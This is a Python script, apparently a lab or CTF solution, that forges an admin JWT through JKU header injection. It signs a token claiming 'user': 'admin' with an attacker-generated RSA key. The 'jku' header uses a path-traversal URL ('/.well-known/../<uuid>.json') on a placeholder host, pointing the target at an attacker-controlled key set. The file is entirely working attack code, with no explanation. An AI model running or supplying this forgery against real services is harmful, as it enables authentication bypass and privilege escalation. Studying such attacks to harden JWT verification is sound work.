import json
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


#openssl genrsa -out private.pem 2048
with open('private.pem', 'rb') as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,  
        backend=default_backend()
    )

headers = {
    "typ": "JWT",
    "alg": "RS256",
    "jku": "http://xxxxxxxxx/.well-known/../996671ec-5639-4443-9af5-ec48e855300d.json"
}

payload = {
  "user": "admin"
}


public_key = private_key.public_key()

n = public_key.public_numbers().n
e = public_key.public_numbers().e

n_b64 = base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('=').replace('+', '')
e_b64 = base64.urlsafe_b64encode(e.to_bytes((e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('=').replace('+', '')

#print("n:", n_b64)
#print("e:", e_b64)

headers_json = json.dumps(headers)
payload_json = json.dumps(payload)

jwt_token = base64.urlsafe_b64encode(headers_json.encode('utf-8')).decode('utf-8').rstrip('=').replace('+', '')
jwt_token += "." + base64.urlsafe_b64encode(payload_json.encode('utf-8')).decode('utf-8').rstrip('=').replace('+', '')
#print(jwt_token)


hash_algorithm = hashes.SHA256()
signature = private_key.sign(jwt_token.encode('utf-8'),padding.PKCS1v15(),hash_algorithm)

jwt_token += "." + base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=', ).replace('+', '')
print(jwt_token)